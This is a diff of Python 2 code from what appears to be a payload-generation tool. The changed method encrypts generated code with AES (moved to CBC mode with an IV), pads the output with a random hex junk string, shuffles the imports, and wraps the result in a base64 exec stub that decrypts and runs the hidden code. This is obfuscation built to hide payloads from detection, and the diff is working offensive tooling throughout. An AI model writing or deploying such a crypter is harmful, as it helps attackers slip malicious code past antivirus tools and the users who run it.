@@ -239,6 +239,7 @@ class FUNCTIONS(object):
         print "|=--------=|"
         print print_deployment
 
+
     def __init__(self):
         self.BLOCK_SIZE = 32
         self.PADDING = '{'
@@ -274,24 +275,23 @@ class FUNCTIONS(object):
                 else:
                     self.output.append(line)
 
-        cipherEnc = AES.new(key)
+        cipherEnc = AES.new(key, AES.MODE_CBC, iv)
 
         encrypted = self.EncodeAES(cipherEnc, "\n".join(self.output))
 
-        b64var, aesvar = self.randVar(), self.randVar()
-
-        self.imports.append("from base64 import b64decode as %s" % (b64var))
-        self.imports.append("from Crypto.Cipher import AES as %s" % (aesvar))
+        self.imports.append("from base64 import b64decode")
+        self.imports.append("from Crypto.Cipher import AES")
 
         random.shuffle(self.imports)
         randomstring = ''.join(random.choice(string.lowercase) for x in range(500))
+        randomimport = ''.join(random.choice(string.lowercase) for x in range(10))
         randombytes = ''
         for i in randomstring:
             randombytes += hex(ord(i))
-        newoutput = "%s%s = \"%s\"\n"%(b64var,aesvar,randombytes) + ";".join(self.imports) + "\n"
+        newoutput = "%s = \"%s\"\n" % (randomimport,randombytes) + ";".join(self.imports) + "\n"
 
-        newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode(
-            "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
+        newoutput += "exec(b64decode(\"%s\"))" % (base64.b64encode(
+            "exec(AES.new(\"%s\", AES.MODE_CBC, \"%s\").decrypt(b64decode(\"%s\")).rstrip('{'))\n" % (key, iv, encrypted)))
         return newoutput
 
     def ServePayload(self, payloaddirectory):
